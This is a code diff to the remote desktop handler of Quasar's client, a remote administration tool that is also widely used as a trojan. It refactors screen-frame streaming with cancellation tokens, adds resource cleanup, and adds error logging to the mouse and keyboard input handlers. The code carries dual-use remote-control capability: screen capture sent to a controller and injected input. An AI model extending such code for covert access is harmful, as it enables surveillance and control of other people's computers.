@@ -24,6 +24,7 @@ namespace Quasar.Client.Messages
         private int _displayIndex = 0;
         private ISender _clientMain;
         private Thread _sendFramesThread;
+        private CancellationTokenSource _cancellationTokenSource;
 
         private readonly Stopwatch _stopwatch = new Stopwatch();
         private int _frameCount = 0;
@@ -94,14 +95,8 @@ namespace Quasar.Client.Messages
 
             if (_sendFramesThread == null || !_sendFramesThread.IsAlive)
             {
-                _sendFramesThread = new Thread(() =>
-                {
-                    _stopwatch.Start();
-                    while (true)
-                    {
-                        CaptureScreen();
-                    }
-                });
+                _cancellationTokenSource = new CancellationTokenSource();
+                _sendFramesThread = new Thread(() => SendFrames(_cancellationTokenSource.Token));
                 _sendFramesThread.Start();
             }
         }
@@ -110,9 +105,11 @@ namespace Quasar.Client.Messages
         {
             Console.WriteLine("Stopping remote desktop session");
 
+            _cancellationTokenSource?.Cancel();
+
             if (_sendFramesThread != null && _sendFramesThread.IsAlive)
             {
-                _sendFramesThread.Abort();
+                _sendFramesThread.Join();
                 _sendFramesThread = null;
             }
 
@@ -140,37 +137,62 @@ namespace Quasar.Client.Messages
             }
         }
 
-        private void CaptureScreen()
+        private void SendFrames(CancellationToken cancellationToken)
         {
-            _desktop = ScreenHelper.CaptureScreen(_displayIndex);
-            _desktopData = _desktop.LockBits(new Rectangle(0, 0, _desktop.Width, _desktop.Height),
-                ImageLockMode.ReadWrite, _desktop.PixelFormat);
-
-            using (MemoryStream stream = new MemoryStream())
+            _stopwatch.Start();
+            while (!cancellationToken.IsCancellationRequested)
             {
-                if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
-                _streamCodec.CodeImage(_desktopData.Scan0,
-                    new Rectangle(0, 0, _desktop.Width, _desktop.Height),
-                    new Size(_desktop.Width, _desktop.Height),
-                    _desktop.PixelFormat, stream);
-                _clientMain.Send(new GetDesktopResponse
-                {
-                    Image = stream.ToArray(),
-                    Quality = _streamCodec.ImageQuality,
-                    Monitor = _streamCodec.Monitor,
-                    Resolution = _streamCodec.Resolution
-                });
-            }
-
-            _frameCount++;
-            if (_stopwatch.ElapsedMilliseconds >= 1000)
-            {
-                Console.WriteLine($"FPS: {_frameCount}");
-                _frameCount = 0;
-                _stopwatch.Restart();
+                CaptureScreen();
             }
         }
 
+        private void CaptureScreen()
+        {
+            try
+            {
+                _desktop = ScreenHelper.CaptureScreen(_displayIndex);
+                _desktopData = _desktop.LockBits(new Rectangle(0, 0, _desktop.Width, _desktop.Height),
+                    ImageLockMode.ReadWrite, _desktop.PixelFormat);
+
+                using (MemoryStream stream = new MemoryStream())
+                {
+                    if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
+                    _streamCodec.CodeImage(_desktopData.Scan0,
+                        new Rectangle(0, 0, _desktop.Width, _desktop.Height),
+                        new Size(_desktop.Width, _desktop.Height),
+                        _desktop.PixelFormat, stream);
+                    _clientMain.Send(new GetDesktopResponse
+                    {
+                        Image = stream.ToArray(),
+                        Quality = _streamCodec.ImageQuality,
+                        Monitor = _streamCodec.Monitor,
+                        Resolution = _streamCodec.Resolution
+                    });
+                }
+
+                _frameCount++;
+                if (_stopwatch.ElapsedMilliseconds >= 1000)
+                {
+                    Console.WriteLine($"FPS: {_frameCount}");
+                    _frameCount = 0;
+                    _stopwatch.Restart();
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error capturing screen: {ex.Message}");
+            }
+            finally
+            {
+                if (_desktopData != null)
+                {
+                    _desktop.UnlockBits(_desktopData);
+                    _desktopData = null;
+                }
+                _desktop?.Dispose();
+                _desktop = null;
+            }
+        }
 
         private void Execute(ISender sender, DoMouseEvent message)
         {
@@ -182,17 +204,8 @@ namespace Quasar.Client.Messages
                 Point p = new Point(message.X + offsetX, message.Y + offsetY);
 
                 // Disable screensaver if active before input
-                switch (message.Action)
-                {
-                    case MouseAction.LeftDown:
-                    case MouseAction.LeftUp:
-                    case MouseAction.RightDown:
-                    case MouseAction.RightUp:
-                    case MouseAction.MoveCursor:
-                        if (NativeMethodsHelper.IsScreensaverActive())
-                            NativeMethodsHelper.DisableScreensaver();
-                        break;
-                }
+                if (NativeMethodsHelper.IsScreensaverActive())
+                    NativeMethodsHelper.DisableScreensaver();
 
                 switch (message.Action)
                 {
@@ -215,17 +228,25 @@ namespace Quasar.Client.Messages
                         break;
                 }
             }
-            catch
+            catch (Exception ex)
             {
+                Console.WriteLine($"Error executing mouse event: {ex.Message}");
             }
         }
 
         private void Execute(ISender sender, DoKeyboardEvent message)
         {
-            if (NativeMethodsHelper.IsScreensaverActive())
-                NativeMethodsHelper.DisableScreensaver();
+            try
+            {
+                if (NativeMethodsHelper.IsScreensaverActive())
+                    NativeMethodsHelper.DisableScreensaver();
 
-            NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
+                NativeMethodsHelper.DoKeyPress(message.Key, message.KeyDown);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error executing keyboard event: {ex.Message}");
+            }
         }
 
         private void Execute(ISender client, GetMonitors message)
@@ -248,6 +269,7 @@ namespace Quasar.Client.Messages
             {
                 StopScreenStreaming();
                 _streamCodec?.Dispose();
+                _cancellationTokenSource?.Dispose();
             }
         }
     }
